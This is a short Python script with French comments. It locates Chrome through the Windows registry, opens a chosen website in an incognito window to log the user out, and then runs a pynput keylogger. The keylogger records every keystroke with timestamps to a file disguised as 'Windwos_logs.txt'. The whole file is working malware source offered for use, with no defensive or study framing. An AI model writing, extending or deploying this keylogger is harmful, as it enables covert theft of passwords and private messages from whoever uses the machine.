from pynput.keyboard import Key, Listener, Controller
import logging, time , winreg, os, shlex, webbrowser, pynput
from os import system 

site_web = "" #Lien du site qui s'ourvira au début
log_dir = r"" #repertoire dans lequel les keylogs sont sauvgardées

#En cours developpement
result = None
if winreg:
    for subkey in ['ChromeHTML\\shell\\open\\command', 'Applications\\chrome.exe\\shell\\open\\command']:
        try: result = winreg.QueryValue(winreg.HKEY_CLASSES_ROOT, subkey)
        except WindowsError: pass
        if result is not None:
            result_split = shlex.split(result, False, True)
            result = result_split[0] if result_split else None
            if os.path.isfile(result):
                break
            result = None
else:
    expected = "google-chrome" + (".exe" if os.name == 'nt' else "")
    for parent in os.environ.get('PATH', '').split(os.pathsep):
        path = os.path.join(parent, expected)
        if os.path.isfile(path):
            result = path
            break
print(result+" %s")
webbrowser.get(result+" %s").open(site_web)
#ouvre la page chrome avec le site fourni (ligne5) en déconectant l'utilisateur.
system("powershell -C Start-Process chrome.exe -ArgumentList @( '-incognito', '"+site_web+"' )")

#keylogger
logging.basicConfig(filename=(log_dir + "Windwos_logs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    print(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

